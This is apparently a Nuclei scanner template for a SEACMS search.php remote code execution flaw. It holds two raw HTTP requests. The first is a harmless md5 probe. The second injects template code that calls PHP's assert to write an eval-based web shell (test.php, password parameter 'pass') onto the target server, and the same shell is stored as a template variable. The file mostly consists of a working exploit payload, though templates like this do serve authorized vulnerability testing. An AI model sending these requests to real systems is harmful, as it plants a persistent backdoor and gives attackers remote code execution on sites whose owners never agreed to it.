id: seacms-search-getshell
info:
  name: SEACMS search.php GetShell
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    SEACMS arbitrary code execution vulnerability allows uploading a shell.
  reference:
    - https://mengsec.com/2018/08/06/SeaCMS-v6-45%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
  tags: rce
http:
  - raw:
      - |
        POST /search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Referer: {{BaseURL}}/search.php
        Origin: {{BaseURL}}
        Accept-Language: zh-CN,zh;q=0.9

        searchtype=5&order=%7D%7Bend+if%7D+%7Bif%3A1%29print%28md5%2888%29%29%3Bif%281%7D%7Bend+if%7D
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "2a38a4a9316c49e5a833517c45d310702a38a4a9316c"
  - raw:
      - |
        POST /search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cache-Control: max-age=0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Referer: {{BaseURL}}/search.php
        Origin: {{BaseURL}}

        searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("test.php","w"),'<?php eval($_POST["pass"]);?>')
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "webshell url:"
variables:
  webshell: "<?php eval($_POST[\"pass\"]);?>"
